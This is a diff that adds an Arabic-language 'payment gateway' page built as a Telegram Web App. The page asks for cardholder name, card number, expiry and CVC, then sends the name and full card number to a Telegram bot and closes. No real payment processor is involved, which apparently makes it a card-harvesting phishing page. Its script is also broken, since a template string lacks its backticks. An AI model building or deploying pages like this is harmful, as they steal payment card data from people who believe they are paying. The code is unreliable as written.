@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
+    <style>
+        /* كود الـ CSS هنا */
+        body {
+            background-color: #f4f4f9;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .payment-card {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        .row { display: flex; gap: 10px; }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4a90e2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-card">
+        <h2>💳 إتمام عملية الدفع</h2>
+        <form id="paymentForm">
+            <input type="text" id="name" placeholder="اسم صاحب البطاقة" required>
+            <input type="number" id="cardNum" placeholder="رقم البطاقة (16 رقم)" required>
+            <div class="row">
+                <input type="text" id="expiry" placeholder="MM/YY" required>
+                <input type="number" id="cvc" placeholder="CVC" required>
+            </div>
+            <button type="button" onclick="sendData()">دفع الآن</button>
+        </form>
+    </div>
+
+    <script>
+        /* كود الـ JavaScript هنا */
+        function sendData() {
+            const name = document.getElementById('name').value;
+            const cardNum = document.getElementById('cardNum').value;
+            
+            // تجميع البيانات لإرسالها للبوت
+            const data = طلب دفع جديد:\nالاسم: ${name}\nرقم البطاقة: ${cardNum};
+            
+            // إرسال البيانات للبوت وإغلاق النافذة
+            window.Telegram.WebApp.sendData(data);
+            window.Telegram.WebApp.close();
+        }
+    </script>
+</body>
+</html>
